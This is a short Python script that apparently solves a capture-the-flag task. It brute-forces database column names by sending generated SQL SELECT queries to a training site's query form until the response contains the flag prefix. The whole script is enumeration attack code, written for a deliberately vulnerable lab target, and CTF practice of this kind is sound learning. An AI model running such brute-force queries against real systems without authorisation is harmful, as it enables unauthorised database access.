from requests import *
import string
s = Session()
alph = string.ascii_letters
print(alph)
url="http://column-name.tasks.cyberschool.msu.ru/index"
def try_check(tec:str,len1:int):
    if len(tec)==len1:
        r = s.post(url,data={"sql_request":f"Select {tec} from characters","submit":"run"})
        print(r)
        if "CS" in r.text:
            print(r.text)
            exit(0)
        return
    for i in alph:
        try_check(tec+i,len1)
for i in range(1,6):
    try_check("",i)